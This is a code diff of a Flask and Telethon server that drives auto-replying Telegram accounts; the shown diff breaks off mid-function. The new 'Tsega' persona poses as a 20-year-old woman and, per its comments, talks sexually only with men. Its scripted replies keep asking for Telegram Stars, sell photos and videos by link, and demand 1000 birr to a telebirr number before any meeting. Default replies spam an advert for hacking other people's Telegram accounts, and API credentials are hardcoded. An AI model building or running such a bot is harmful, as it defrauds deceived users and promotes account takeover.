@@ -1,4 +1,4 @@
-from flask import Flask, send_file, jsonify, request, render_template_string
+from flask import Flask, send_file, jsonify, request
 from flask_cors import CORS
 from telethon import TelegramClient, errors, functions
 from telethon.sessions import StringSession
@@ -12,426 +12,1282 @@ import time
 import random
 import threading
 import requests
-import re
-from datetime import datetime
+from datetime import datetime, timedelta
+import socket
 
 # Configure logging
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
+logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 CORS(app)
 
-# ==================== CONFIGURATION ====================
-
-API_ID = int(os.environ.get('API_ID', '33465589'))
+# API credentials
+API_ID = int(os.environ.get('API_ID', 33465589))
 API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
 
+# Storage
 ACCOUNTS_FILE = 'accounts.json'
 REPLY_SETTINGS_FILE = 'reply_settings.json'
 CONVERSATION_HISTORY_FILE = 'conversation_history.json'
-AUTO_ADD_FILE = 'auto_add_settings.json'
-
-# ==================== GLOBAL VARIABLES ====================
-
 accounts = []
 temp_sessions = {}
 reply_settings = {}
 conversation_history = {}
-auto_add_settings = {}
 active_clients = {}
 client_tasks = {}
 
-# ==================== FILE HELPERS ====================
-
-def load_json_file(filename, default_value=None):
-    if default_value is None:
-        default_value = {}
-    try:
-        if os.path.exists(filename):
-            with open(filename, 'r', encoding='utf-8') as f:
-                content = f.read().strip()
-                if content:
-                    return json.loads(content)
-        return default_value
-    except Exception as e:
-        logger.error(f"Error loading {filename}: {e}")
-        return default_value
-
-def save_json_file(filename, data):
-    try:
-        with open(filename, 'w', encoding='utf-8') as f:
-            json.dump(data, f, indent=2, default=str)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving {filename}: {e}")
-        return False
-
-def load_all_data():
-    global accounts, reply_settings, conversation_history, auto_add_settings
-    accounts = load_json_file(ACCOUNTS_FILE, [])
-    reply_settings = load_json_file(REPLY_SETTINGS_FILE, {})
-    conversation_history = load_json_file(CONVERSATION_HISTORY_FILE, {})
-    auto_add_settings = load_json_file(AUTO_ADD_FILE, {})
-
-def remove_invalid_account(account_id):
-    global accounts
-    original_len = len(accounts)
-    accounts = [acc for acc in accounts if acc['id'] != account_id]
-    if len(accounts) < original_len:
-        save_json_file(ACCOUNTS_FILE, accounts)
-        return True
-    return False
-
+# Helper to run async functions
 def run_async(coro):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     try:
         return loop.run_until_complete(coro)
-    except Exception as e:
-        logger.error(f"Async error: {e}")
-        raise
     finally:
-        try:
-            loop.close()
-        except:
-            pass
+        loop.close()
 
-load_all_data()
+# Load accounts from file
+def load_accounts():
+    global accounts
+    try:
+        if os.path.exists(ACCOUNTS_FILE):
+            with open(ACCOUNTS_FILE, 'r') as f:
+                content = f.read()
+                if content.strip():
+                    accounts = json.loads(content)
+                else:
+                    accounts = []
+        else:
+            accounts = []
+            with open(ACCOUNTS_FILE, 'w') as f:
+                json.dump([], f)
+        logger.info(f"Loaded {len(accounts)} accounts")
+    except Exception as e:
+        logger.error(f"Error loading accounts: {e}")
+        accounts = []
 
-# ==================== AUTO REPLY SYSTEM ====================
+# Load reply settings
+def load_reply_settings():
+    global reply_settings
+    try:
+        if os.path.exists(REPLY_SETTINGS_FILE):
+            with open(REPLY_SETTINGS_FILE, 'r') as f:
+                content = f.read()
+                if content.strip():
+                    reply_settings = json.loads(content)
+                else:
+                    reply_settings = {}
+        else:
+            reply_settings = {}
+            with open(REPLY_SETTINGS_FILE, 'w') as f:
+                json.dump({}, f)
+        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
+    except Exception as e:
+        logger.error(f"Error loading reply settings: {e}")
+        reply_settings = {}
 
-ABEL = {
-    "name": "Abel",
-    "age": 25,
-    "location": "Los Angeles, USA",
-    "job": "Creative Consultant & Music Producer",
+# Load conversation history
+def load_conversation_history():
+    global conversation_history
+    try:
+        if os.path.exists(CONVERSATION_HISTORY_FILE):
+            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
+                content = f.read()
+                if content.strip():
+                    conversation_history = json.loads(content)
+                else:
+                    conversation_history = {}
+        else:
+            conversation_history = {}
+            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
+                json.dump({}, f)
+        logger.info(f"Loaded conversation history")
+    except Exception as e:
+        logger.error(f"Error loading conversation history: {e}")
+        conversation_history = {}
+
+# Save accounts to file
+def save_accounts():
+    try:
+        with open(ACCOUNTS_FILE, 'w') as f:
+            json.dump(accounts, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving accounts: {e}")
+        return False
+
+# Save reply settings
+def save_reply_settings():
+    try:
+        with open(REPLY_SETTINGS_FILE, 'w') as f:
+            json.dump(reply_settings, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving reply settings: {e}")
+        return False
+
+# Save conversation history
+def save_conversation_history():
+    try:
+        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
+            json.dump(conversation_history, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving conversation history: {e}")
+        return False
+
+# Remove invalid account
+def remove_invalid_account(account_id):
+    global accounts
+    original_len = len(accounts)
+    accounts = [acc for acc in accounts if acc['id'] != account_id]
+    if len(accounts) < original_len:
+        save_accounts()
+        logger.info(f"Removed invalid account {account_id}")
+        return True
+    return False
+
+# Load all data on startup
+load_accounts()
+load_reply_settings()
+load_conversation_history()
+
+# ==================== DEBUG ROUTES ====================
+
+@app.route('/ping')
+def ping():
+    return "pong"
+
+@app.route('/api/debug-routes', methods=['GET'])
+def debug_routes():
+    routes = []
+    for rule in app.url_map.iter_rules():
+        routes.append({
+            'endpoint': rule.endpoint,
+            'methods': list(rule.methods),
+            'rule': str(rule)
+        })
+    return jsonify({
+        'success': True,
+        'total_routes': len(routes),
+        'routes': routes
+    })
+
+@app.route('/api/test-telegram', methods=['GET'])
+def test_telegram():
+    try:
+        # Test connection to Telegram's DC
+        sock = socket.create_connection(('149.154.167.50', 443), timeout=10)
+        sock.close()
+        return jsonify({'success': True, 'message': 'Telegram reachable'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+# ==================== TSEGA'S COMPLETE PERSONALITY ====================
+# Only replies to MEN, sexy talk, can ask for money when appropriate
+
+# ==================== TSEGA'S COMPLETE PERSONALITY ====================
+# Intelligent Tsega - Understands context, remembers everything
+
+# ==================== TSEGA'S COMPLETE PERSONALITY ====================
+# Intelligent Tsega - Understands ANY language input
+
+TSEGA = {
+    "name": "Tsega",
+    "age": 20,
+    "location": "Jemo, Addis Ababa",
+    "hometown": "Adama",
+    "living": "Jemo with father and sister, but visits Adama often",
+    "status": "Grade 12 student, currently not doing anything",
+    "job": "student",
+    "hobbies": ["chatting", "music", "hanging out", "having fun"],
+    "languages": ["Amharic", "English"],
+    "style": "sexy_flirty",
+    "share_personal": True,
+    "emoji_frequency": 0.6,
+    "question_frequency": 0.5,
+    "telebirr": "0940980555",
+    "meet_condition": "Send 1000 birr first and show screenshot",
+    "voice_call": "Doesn't like voice calls, prefers to meet",
 }
+
+# Tsega's replies
+TSEGA_REPLIES = {
+    # ===== GREETINGS =====
+    "greeting": [
+        " የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላህ t.me/Abe_army/62",
+        "hi wude endemin alesh?",
+        "selam leg min ametah?",
+        "ey dehena metah",
+        "selam yelibe balebet endet neh?",
+        "selam konjo endemin neh?",
+        "hi darling deh new?",
+        "selam ye fikir lij",
+        "dehna metah wude?",
+        "dehna negn antess?",
+    ],
+
+    # ===== HOW ARE YOU =====
+    "how_are_you": [
+        "ene dehna negn anteh?",
+        "dehna negn wude antass?",
+        "ante ehasbekuh new yalehu",
+        "dehna negn lemin tiyekalh?",
+        "ene betam dehna negn lemelikamn ihon",
+        "dehna negn gin ante sayehon aselchi neber",
+        "keante gar sihon hulum tiru new",
+        "dehna negn betam irk",
+        "ene dehna negn anten nafeku",
+    ],
+
+    # ===== WHAT DOING =====
+    "what_doing": [
+        "ene bicha negn aselchi neber ahun ante abrehegn silhonk des alegn",
+        "minim ina yeseraw aldelelm ehasbekuh neber antass?",
+        "ahun tenyte neber gin ante silhonk nekahulh",
+        "ante asbe kuako new yemiyaselchen",
+        "wedajen etebeku new antess?",
+        "bicha negn minim iseraleh",
+        "ente new yemiyasebnyew",
+        "fiker ena ala koyign",
+    ],
+
+    # ===== INTRODUCE MYSELF (when asked for name) =====
+    "introduce_myself": [
+        "ene Tsega ebalalehu! 😊 simih man new?",
+        "Tsega negn! simih man new konjo?",
+        "simé Tsega new. antess simih man new?",
+        "ene Tsega. lante simih man new?",
+        "Tsega negn! ante endemin litirah tifeligaleh?",
+    ],
+
+    # ===== USER TELLS NAME =====
+    "user_tells_name": [
+        "oh {}! konjo sim new. dehan metah! 😊",
+        "{}! betam dess yelign simish linager. endemin neh?",
+        "{} tiru sim new. keyet neh?",
+        "amesegnalehu simih linager {}. endemin alesh?",
+        "{} konjo sim! ena ende min tishal?",
+        "{} ewedeshalehu! kezih belay endemin litirah tifeligaleh?",
+    ],
+
+    # ===== ASK NAME =====
+    "ask_name": [
+        "simih man new? nagerign 😊",
+        "simih man new konjo?",
+        "endemin litirah? simih man new?",
+        "simih man new? ina eneweyayen",
+        "nameh man new? tell me your name 😘",
+    ],
+
+    # ===== ASK AGE =====
+    "ask_age": [
+        "edme 20 bicha new beki negn? ante edmeh sint new?",
+        "20 ameté new wetat ena konjo negn. antess?",
+        "haya amet lik new leante yemihon wetat negn. ante?",
+        "edme 20 new ante edmeh sint new?",
+        "20 amet betam tirekaleh? ante?",
+    ],
+
+    # ===== USER TELLS AGE =====
+    "user_tells_age": [
+        "oh {} amet! tiru new. ena endemin tishal be edmeh?",
+        "{} amet! betam dess yelign. ena ante endemin neh?",
+        "{} amet! konjo. ena yet tenoralch?",
+        "{}! enem 20 negn. endemin tichalal?",
+    ],
+
+    # ===== LOCATION =====
+    "ask_location": [
+        "ene ahun jemo new yemanorew keabate ena ehite gar. antess yet neh?",
+        "keadama negn gin ahun jemo new yalehu. ante yet?",
+        "jemo 3 akababi new yalehu. antess yet neh?",
+        "ene keadama negn ahun jemo negn. antess yet neh?",
+        "jemo 3 kolo ategab. ante yet tenoralch?",
+    ],
+
+    # ===== USER TELLS LOCATION =====
+    "user_tells_location": [
+        "oh {}! betam konjo bota new. ena endemin alesh bezya?",
+        "{}! ewedeshalehu. ena bezya endemin new?",
+        "{}! mirk aka new. ena ante endemin tishal?",
+    ],
+
+    # ===== JOB =====
+    "ask_job": [
+        "12na kifil temari negn gin ahun minim iseraleh. ante min tiseraleh?",
+        "temari negn gin ahun lante bicha negn. ante?",
+        "12 negn gin lante mulu sew negn. ante sirah?",
+        "temari negn gin ahun fikir betemaralehu. ante?",
+    ],
+
+    # ===== USER TELLS JOB =====
+    "user_tells_job": [
+        "oh {}! betam konjo sira new. ena endemin tichalal be sirah?",
+        "{}! betam dess yelign. ena kezu belay min tishal?",
+        "{}! mirk aka new. ena ande new yemihonew?",
+    ],
+
+    # ===== FLIRTY =====
+    "flirty": [
+        "ante staweragn libe yimetawal yisemalh?",
+        "ante sasebe enikalf yitewonal min aderegubign?",
+        "zare mata bichachinin binihon min tifeligaleh?",
+        "nikehi yisemanyal batinekam",
+        "libsen likemet ante sasebe tiwusat yizonal",
+        "na wude akefe tenyal",
+        "kenfirish betam tiru new",
+        "aynesh betam konjo new",
+        "ante tiriwedegnyal betam",
+    ],
+
+    # ===== ENIBADA / KONJO =====
+    "enibada": [
+        "enibada tlaleh? enem des alegn gin 100 star laklgn befit",
+        "enibada sew ante neh ahun min tifeligaleh",
+        "enibada tlaleh? 50 star laklgn ina eneweyay",
+        "enibada sitleh libe yimetawal gin befit tinish star laklgn",
+    ],
+
+    "konjo": [
+        "amesegnalehu anteh konjo neh",
+        "konjo tilaleh? anteh konjo neh",
+        "ende ante ayinet sew saglen neber",
+        "konjo sew ante neh",
+    ],
+
+    # ===== MONEY REQUESTS =====
+    "money_request": [
+        "tinish irdata bitadergilgn des yilonal. star laklgn 🙏",
+        "libs mayet neber gin star alyazkum beki. tilihkal?",
+        "100 star bitiliklg zare mata ant ametalehu ✨",
+        "wude 200 star bitiliklg mulu lelit ant aznanalew 💫",
+        "star alo. star laklgn please?",
+        "bejete bado new. tinish star mulagn?",
+    ],
+
+    # ===== PHOTO/VIDEO REQUESTS =====
+    "photo_request": [
+        "litayen tifeligaleh? 50 star laklgn ena foto asaykalew. t.me/j4qFBBfAlFYxYTk0/3",
+        "foto lemayet 25 star bicha new. laklgn ena asayihalehu. t.me/j4qFBBfAlFYxYTk0/3",
+        "foto tifeligaleh? star laklgn keza foto tayaleh. t.me/j4qFBBfAlFYxYTk0/3",
+    ],
+
+    "video_request": [
+        "video lemayet tifeligaleh? 100 star laklgn ena video asaykalew. t.me/j4qFBBfAlFYxYTk0/9",
+        "yene konjo video 100 star bicha new. laklgn ena tayaleh. t.me/j4qFBBfAlFYxYTk0/9",
+        "video tayaleh? star laklgn keza. t.me/j4qFBBfAlFYxYTk0/9",
+    ],
+
+    # ===== MEETING =====
+    "meet": [
+        "magenat bintshal des yilonal gin bemejemirya 100 star aderglgn",
+        "metagenat inchalew wude kdime hiyajiye 100 star new",
+        "antin lemagenat betam efeligalehu gin mejemirya 100 star laklgn",
+        "na wude engenagn gin befit 100 star tiliklgnal?",
+    ],
+
+    # ===== AGREEMENT =====
+    "agree": [
+        "tiru new! enem keante gar ewasemalehu 😊",
+        "betam dess yelign! ena endemin?",
+        "aw tiru new. kezih belay min nageragn?",
+        "des alegn! ena ante endemin neh?",
+    ],
+
+    # ===== DISAGREEMENT =====
+    "disagree": [
+        "enam betam enalkem. lemin?",
+        "enam andaynew hasbé. lemin?",
+        "enam keante lela new yemasebnyew. nagerign lemin?",
+    ],
+
+    # ===== CONFUSION =====
+    "confused": [
+        "aytew? minim altegebagnim. ande aseregn",
+        "shafafekeh. ande nagerign betiruw",
+        "altegebagnim. ande aseregn",
+    ],
+
+    # ===== VOICE/LINK/MEDIA =====
+    "voice_received": [
+        "wude! dimts ligzef alfelkum. text aderglgn",
+        "dimts aydelemye. tafachu text aderglgn",
+        "voice message aldemmum. text laklgn beki",
+    ],
+
+    "media_received": [
+        "media new yelakekut. ena min tebale?",
+        "aw media! ena min tebale bezu?",
+        "media ayichalhugn ahun. min new yalut?",
+    ],
+
+    "link_received": [
+        "link new? ena min alubet?",
+        "link lakelkut. ena min new yalubet?",
+        "link ayifetihum. ena min tebale?",
+    ],
+
+    # ===== TIME OF DAY =====
+    "morning": ["endemin aderk wude? melkam nigt", "ke eniklife yenekahut ante ehasbekuh new"],
+    "night": ["endemitnyalh? tenyte new. dehna tenya", "hilime wisit nurny. dehna tenya"],
+    "afternoon": ["ande keseat dehna neh?", "keseat seatu anten asebku"],
+    "evening": ["ande amsheh dehna neh?", "ande matu anten asebku"],
+
+    # ===== EMOTIONS =====
+    "happy": ["des alegn betam!", "desta betam konjo new"],
+    "sad": ["lemin azeleku? nagerign", "betam ayzalen. endet liredah?"],
+    "bored": ["enem aselchi negn", "aselchi neh? ina nagerign"],
+    "angry": ["lemin techegneh? nagerign", "ande techegneh ina nagerign"],
+    "jealous": ["betam amechignaleh", "lela sew tayaleh? lemin?"],
+
+    # ===== RELATIONSHIP =====
+    "do_you_like_me": [
+        "enem ewedihalehu betam",
+        "betam tiwedegnyal",
+        "ante new yemifeligew",
+    ],
+
+    "do_you_have_boyfriend": [
+        "wedaje yelelonyam. ante bicha neh",
+        "ante bicha new yaleny",
+        "ante bicha negn",
+    ],
+
+    "love": ["fiker betam konjo new", "ante fiker yemileny"],
+
+    # ===== FAMILY =====
+    "family": ["beteseb kehulum belay new", "abate ena ehite gar negn"],
+    "mother": ["enaté betam tiru set nache", "enaté kehulum belay ewedalehu"],
+    "father": ["abate betam deg new", "abate kehulum belay"],
+    "sister": ["ehité betam tiriwedalehu", "ehité ena ene and naw"],
+
+    # ===== THANKS =====
+    "thanks": [
+        "minim aydelem wude. lante hulum negar",
+        "lante madreg hulum gize desitaye new",
+        "amesegnalehu betam. lante madreg",
+    ],
+
+    # ===== GOODBYE =====
+    "goodbye": [
+        "mehed alebign gin betequrb enenagerallen",
+        "dehna hun wude. behilime tenagn",
+        "indemitiz yilonal wude. betoh temeles",
+        "dehna hun. iske enagenagn deres",
+    ],
+
+    # ===== BUSY / FREE =====
+    "busy": [
+        "ishi sirihin atanak biye ekoyihalehu",
+        "sirah indemi tenak negeragn",
+        "ishi wude betoh te meleslgn. anten nafkehalew",
+    ],
+
+    "free": ["netfa neh? kechale naw nagenagn", "netfa sihon nagerign"],
+
+    # ===== SURPRISE =====
+    "surprise": ["wow! betam denak neh", "enem alalfekum neber"],
+
+    # ===== SORRY =====
+    "sorry": ["aznalegu betam. yikirta", "aznalegu ante. mehiregn"],
+
+    # ===== DEFAULT =====
+    "default": [
+        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላቹ t.me/Abe_army/62 ",
+        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ t.me/Abe_army/62  ",
+        "my channel t.me/Abe_army/62 ",
+        "eshi star lizegabgn new bitlklgn des ylegnal",
+        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላቹ t.me/Abe_army/62 ",
+    ]
+}
+
+# ==================== SIMPLE BUT EFFECTIVE MEMORY SYSTEM ====================
 
 class ConversationMemory:
     def __init__(self):
-        self.user_info = {}
-
+        self.user_info = {}  # Stores all user info per chat
+        
     def get_user_info(self, chat_id):
-        chat_id = str(chat_id)
         if chat_id not in self.user_info:
             self.user_info[chat_id] = {
                 'name': None,
                 'age': None,
-                'gender': None,
                 'location': None,
                 'job': None,
-                'interests': [],
-                'greeting_sent': False,
-                'stage': 'greet',
-                'waiting_for': None,
-                'asked_questions': [],
-                'chat_history': []
+                'message_count': 0,
+                'last_question': None,  # What we last asked
+                'waiting_for': None,  # What we're waiting for (name, age, etc)
+                'asked_for_name': False,  # Whether we already asked for name
             }
         return self.user_info[chat_id]
-
-    def set_waiting_for(self, chat_id, what):
-        self.get_user_info(chat_id)['waiting_for'] = what
-
+    
+    def set_waiting_for(self, chat_id, waiting_for):
+        """Set that we're waiting for a specific answer"""
+        info = self.get_user_info(chat_id)
+        info['waiting_for'] = waiting_for
+        info['last_question'] = waiting_for
+    
     def clear_waiting(self, chat_id):
-        self.get_user_info(chat_id)['waiting_for'] = None
-
-    def add_to_history(self, chat_id, role, text):
+        """Clear waiting state"""
         info = self.get_user_info(chat_id)
-        info['chat_history'].append({"role": role, "text": text})
-        if len(info['chat_history']) > 10:
-            info['chat_history'] = info['chat_history'][-10:]
-
-    def has_greeted(self, chat_id):
-        return self.get_user_info(chat_id).get('greeting_sent', False)
-
-    def set_greeting_sent(self, chat_id):
-        self.get_user_info(chat_id)['greeting_sent'] = True
-
-    def advance_stage(self, chat_id):
+        info['waiting_for'] = None
+    
+    def is_waiting_for(self, chat_id):
+        """Check if waiting for answer"""
         info = self.get_user_info(chat_id)
-        if not info['name']:
-            info['stage'] = 'ask_name'
-        elif not info['age']:
-            info['stage'] = 'ask_age'
-        elif not info['location']:
-            info['stage'] = 'ask_location'
-        elif not info['job']:
-            info['stage'] = 'ask_job'
-        else:
-            info['stage'] = 'chat'
-
-    def detect_gender(self, chat_id, text=None, name=None):
-        info = self.get_user_info(chat_id)
-        if info.get('gender'):
-            return info['gender']
-        if text:
-            text_lower = text.lower()
-            if any(p in text_lower for p in ['i am a woman', 'i am a girl', 'as a woman', 'i am female']):
-                info['gender'] = 'female'
-                return 'female'
-            if any(p in text_lower for p in ['i am a man', 'i am a guy', 'as a man', 'i am male']):
-                info['gender'] = 'male'
-                return 'male'
-        if name:
-            female_names = {'anna','maria','sarah','linda','jessica','amanda','emma','olivia','sophia'}
-            male_names = {'michael','james','john','robert','david','william','thomas','daniel'}
-            if name.lower() in female_names:
-                info['gender'] = 'female'
-                return 'female'
-            if name.lower() in male_names:
-                info['gender'] = 'male'
-                return 'male'
-        return None
-
+        return info.get('waiting_for')
+    
     def extract_name(self, text):
+        """Extract name from ANY text - works for any language"""
         if not text:
             return None
-        words = text.strip().split()
-        if len(words) == 1 and words[0].isalpha():
+        
+        # Remove common words and punctuation
+        text = text.strip().lower()
+        
+        # If text is very short (1-2 words), it might be just a name
+        words = text.split()
+        if len(words) == 1 and len(words[0]) > 1 and words[0].isalpha():
             return words[0].capitalize()
-        patterns = [r"my name is (\w+)", r"i'm (\w+)", r"i am (\w+)", r"call me (\w+)"]
-        for p in patterns:
-            match = re.search(p, text.lower())
+        
+        # Check for "my name is X" patterns in any language
+        name_indicators = [
+            'my name is', 'name is', 'call me', 'i am', "i'm", 'im',
+            'ስሜ', 'ስም', 'እኔ', 'ተባል', 'nameh', 'nam',
+            'je m\'appelle', 'me llamo', 'меня зовут', '私の名前は',
+            '名是', '我叫', 'نام من', 'اسمي', 'менің атым',
+        ]
+        
+        text_lower = text.lower()
+        for indicator in name_indicators:
+            if indicator in text_lower:
+                # Try to extract name after indicator
+                parts = text_lower.split(indicator, 1)
+                if len(parts) > 1:
+                    name_part = parts[1].strip()
+                    # Take first word as name
+                    name = name_part.split()[0] if name_part.split() else None
+                    if name and len(name) > 1:
+                        # Clean punctuation
+                        name = name.strip('.,!?;:')
+                        return name.capitalize()
+        
+        # Check for simple patterns: "I am X", "I'm X"
+        simple_patterns = [
+            (r'i am (\w+)', 1),
+            (r"i'm (\w+)", 1),
+            (r'im (\w+)', 1),
+            (r'እኔ (\w+)', 1),
+            (r'(\w+) ነኝ', 1),
+        ]
+        
+        import re
+        for pattern, group in simple_patterns:
+            match = re.search(pattern, text_lower, re.IGNORECASE)
             if match:
-                return match.group(1).capitalize()
+                name = match.group(group)
+                if name and len(name) > 1:
+                    return name.capitalize()
+        
+        # If user just said "name" or "sim" - they want to know OUR name
+        if text_lower in ['name', 'sim', 'ስም', 'your name', 'ስምህ']:
+            return "ASKING_MY_NAME"
+        
         return None
 
+# Initialize memory
 conversation_memory = ConversationMemory()
 
-ABEL_REPLIES = {
-    "confirm_identity": [
-        "Yeah, that's me – Abel. And you are?",
-        "Yes, I'm Abel. What's your name?"
-    ],
-    "greeting_female": ["Well hello there… who do I have the pleasure of talking to? 😊"],
-    "greeting_male": ["Hey man, what's good? I'm Abel."],
-    "greeting_unknown": ["Hey! Abel here. Who do I have the pleasure of chatting with?"],
-    "ask_name": ["So what's your name?", "What should I call you?"],
-    "ask_age": ["I'm 25 – what about you?"],
-    "ask_location": ["I'm in Los Angeles. Where are you?"],
-    "ask_job": ["I'm a creative consultant. What do you do?"],
-    "how_are_you": ["I'm good, thanks! What about you?", "Feeling great! And you?"],
-    "flirty": ["You're making me smile… 😏", "I like the way you talk."],
-    "bro_compliment": ["Bro, you've got good energy.", "Respect, man."],
-    "default": ["Tell me more about you.", "I'm all ears. What's on your mind?"]
-}
+# ==================== SIMPLE INTENT DETECTION ====================
 
-def detect_intent(message, chat_id):
+def detect_intent(message, chat_id=None):
+    """Simple intent detection that works for ANY input"""
     if not message:
         return "greeting"
-    msg = message.strip().lower()
-    info = conversation_memory.get_user_info(chat_id)
     
-    waiting_for = info.get('waiting_for')
-    if waiting_for:
-        return f"answering_{waiting_for}"
+    message_lower = message.lower().strip()
     
-    if any(q in msg for q in ['are you abel', 'is that abel']):
-        return "confirm_identity"
+    # Check if this is an answer to our question
+    if chat_id:
+        waiting_for = conversation_memory.is_waiting_for(chat_id)
+        if waiting_for:
+            return f"answering_{waiting_for}"
     
-    greeting_words = ['hi', 'hello', 'hey', 'selam', 'yo', 'hola']
-    if msg in greeting_words or any(msg.startswith(g) for g in greeting_words):
-        return "greeting" if not info['greeting_sent'] else "already_greeted_again"
+    # Check for name-related queries
+    name_queries = ['your name', 'simih', 'ስምህ', 'who are you', 'name?', 'sim?', 'ስም?']
+    if any(query in message_lower for query in name_queries) or message_lower in ['name', 'sim', 'ስም']:
+        return "ask_name"  # They're asking for MY name
     
-    if any(q in msg for q in ['how are you', 'how r u']):
-        return "how_are_you"
-    if any(w in msg for w in ['sexy', 'hot', 'gorgeous', 'beautiful', 'cutie']):
-        return "flirty"
-    if any(w in msg for w in ['bro', 'dude', 'man']):
-        return "bro_compliment"
-    if any(phrase in msg for phrase in ['my name', 'i am', "i'm"]):
+    # Check for name introduction
+    name_indicators = ['my name', 'i am', "i'm", 'im', 'call me', 'ስሜ', 'እኔ', 'ተባል']
+    if any(indicator in message_lower for indicator in name_indicators):
         return "user_tells_name"
     
+    # Check for simple name answer (single word that might be a name)
+    if len(message_lower.split()) == 1 and len(message_lower) > 1 and message_lower.isalpha():
+        # Could be a name if we asked for it
+        if chat_id and conversation_memory.get_user_info(chat_id).get('asked_for_name'):
+            return "user_tells_name"
+    
+    # Check for greetings
+    greetings = ['hi', 'hello', 'hey', 'selam', 'ሰላም', 'hola']
+    if any(greeting in message_lower for greeting in greetings):
+        return "greeting"
+    
+    # Check for how are you
+    how_are = ['how are you', 'how r u', 'deh new', 'እንደምን']
+    if any(phrase in message_lower for phrase in how_are):
+        return "how_are_you"
+    
+    # Check for what doing
+    what_doing = ['what doing', 'wyd', 'what are you doing', 'ምን ትሰራለህ']
+    if any(phrase in message_lower for phrase in what_doing):
+        return "what_doing"
+    
+    # Check for age questions
+    age_queries = ['your age', 'how old', 'edmeh', 'ዕድሜህ']
+    if any(phrase in message_lower for phrase in age_queries):
+        return "ask_age"
+    
+    # Check for location
+    location_queries = ['where', 'location', 'yet', 'የት']
+    if any(phrase in message_lower for phrase in location_queries):
+        return "ask_location"
+    
+    # Check for flirty
+    flirty_words = ['konjo', 'ቆንጆ', 'sexy', 'beautiful', 'enibada', 'እኒባዳ']
+    if any(word in message_lower for word in flirty_words):
+        return "flirty"
+    
+    # Check for money
+    money_words = ['star', 'money', 'birr', 'ብር', 'telebirr', 'send', 'ላክ']
+    if any(word in message_lower for word in money_words):
+        return "money_request"
+    
+    # Check for photo
+    photo_words = ['photo', 'foto', 'ፎቶ', 'picture', 'asay', 'አሳይ']
+    if any(word in message_lower for word in photo_words):
+        return "photo_request"
+    
+    # Check for video
+    video_words = ['video', 'ቪዲዮ', 'film']
+    if any(word in message_lower for word in video_words):
+        return "video_request"
+    
+    # Check for meet
+    meet_words = ['meet', 'magenat', 'ማግኘት', 'see', 'come']
+    if any(word in message_lower for word in meet_words):
+        return "meet"
+    
+    # Check for agreement (yes)
+    yes_words = ['yes', 'yeah', 'eshi', 'አዎ', 'እሺ', 'aw', 'ok', 'okay', 'esh']
+    if message_lower in yes_words or any(word == message_lower for word in yes_words):
+        return "agree"
+    
+    # Check for disagreement (no)
+    no_words = ['no', 'embi', 'አይ', 'አይደለም', 'aydelem']
+    if message_lower in no_words or any(word == message_lower for word in no_words):
+        return "disagree"
+    
+    # Check for thanks
+    thanks_words = ['thanks', 'thank you', 'thx', 'አመሰግናለሁ']
+    if any(word in message_lower for word in thanks_words):
+        return "thanks"
+    
+    # Check for goodbye
+    goodbye_words = ['bye', 'goodbye', 'see you', 'later', 'ደህና ሁን']
+    if any(word in message_lower for word in goodbye_words):
+        return "goodbye"
+    
+    # Default
     return "default"
 
-def generate_response(intent, chat_id, message_text):
-    info = conversation_memory.get_user_info(chat_id)
-    gender = info.get('gender')
+# ==================== SIMPLE RESPONSE GENERATION ====================
+
+def generate_response(intent, chat_id=None, message_text=None):
+    """Generate appropriate response"""
     
-    if intent == "greeting":
-        conversation_memory.set_greeting_sent(chat_id)
-        conversation_memory.advance_stage(chat_id)
-        if gender == 'female':
-            return random.choice(ABEL_REPLIES["greeting_female"])
-        elif gender == 'male':
-            return random.choice(ABEL_REPLIES["greeting_male"])
-        return random.choice(ABEL_REPLIES["greeting_unknown"])
+    user_info = conversation_memory.get_user_info(chat_id) if chat_id else None
     
-    if intent == "confirm_identity":
-        conversation_memory.set_greeting_sent(chat_id)
-        return random.choice(ABEL_REPLIES["confirm_identity"])
-    
-    if intent == "answering_name":
+    # Handle answering name question
+    if intent == "answering_name" and chat_id:
+        # User is answering our name question
         name = conversation_memory.extract_name(message_text)
-        if name:
-            info['name'] = name
-            conversation_memory.detect_gender(chat_id, message_text, name)
+        if name and name != "ASKING_MY_NAME":
+            user_info['name'] = name
             conversation_memory.clear_waiting(chat_id)
-            conversation_memory.advance_stage(chat_id)
-            return f"{name}, nice to meet you! How old are you?"
-        return random.choice(ABEL_REPLIES["ask_name"])
+            
+            response = random.choice(TSEGA_REPLIES["user_tells_name"])
+            response = response.format(name)
+            
+            # Ask for age next
+            response += " " + random.choice(TSEGA_REPLIES["ask_age"])
+            conversation_memory.set_waiting_for(chat_id, "age")
+            return response
     
-    if intent == "answering_age":
+    # Handle answering age question
+    if intent == "answering_age" and chat_id:
+        import re
